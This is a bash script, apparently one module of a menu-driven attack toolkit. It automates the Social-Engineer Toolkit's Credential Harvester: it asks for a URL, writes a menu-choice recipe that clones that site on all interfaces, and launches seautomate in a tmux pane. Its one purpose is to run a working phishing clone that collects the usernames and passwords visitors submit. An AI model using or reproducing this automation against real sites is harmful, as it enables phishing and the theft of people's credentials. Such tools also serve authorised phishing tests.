#!/bin/bash

source kp.conf
source $MODULES_PATH/misc_module.sh

function menu_setoolkit(){
    clear
	header
    num3 0 "Attack"
    num2 3 "Social-Engineering" "(setoolkit)"
    num1 6 "Website_Attack_Vectors" "(Credential_Harvester_Attack)"
    num9 6 "Back"
    read -n 1 -s NUM
    case $NUM in
    1)
        cmd_setoolkit
        ;;
    9)
        menu_attack
        ;;
    *)
        ;;
    esac
}

function cmd_setoolkit(){
    clear
    figlet setoolkit
    BASE=`pwd`
    printf "┌─(${PURPLE}$TITLE${NC})${RED}${USERNAME}@${HOSTNAME}${NC}:${YELLOW}[3]Attack${WHITE} > [2]Social-Engineering > [1]Website_Attack_Vectors${NC}\n"
    echo "|"
    printf "|${RED}  ########  Caution!  ########${NC}\n"
    echo "|"
    printf "+${BLUE}usage${NC}: setoolkit (${RED}Run as Root${NC})\n"
	if [ ! ${EUID:-${UID}} = 0 ];then
		echo "└─Command > Back"
	else
        printf "+${BLUE}Information${NC}:\n"
        printf "|  The ${WHITE}Credential Harvester${NC} method will utilize web cloning of a web-site\n"
        echo "|  that has a username and password field and harvest all the information posted to the website."
        echo "|"
        echo "|  This method will completely clone a website of your choosing"
        echo "|  and allow you to utilize the attack vectors within the completely"
        echo "|  same web application you were attempting to clone."
        echo "|"
        read -p "> Enter the url to clone: " URL
        cat <<EOF >> set_recipe.txt
1
2
3
2
0.0.0.0
$URL
EOF
        cd /usr/share/set
        echo "+  ${YELLOW}Method${NC}   : Credential Harvester"
        echo "+  ${YELLOW}Clone URL${NC}: $URL"
        cmd="./seautomate $BASE/set_recipe.txt"
        echo "└─Command > $cmd"
        echo ""
        echo "> You ready?"
        num1 0 "No"
        num2 0 "Yes"
        read -n 1 -s ANS
        if [ ! -z "$ANS" ];then
            if [ $ANS = "2" ];then
                show_number 321 "SET Website_Attack_Vectors"
                tmux split-window -v
                tmux send-keys "${cmd};read;exit" C-m
                tmux select-pane -t "${TITLE}".0
                # eval $cmd
            else
                :
            fi
        else
            :
        fi
        cd $BASE
        rm set_recipe.txt
    fi
}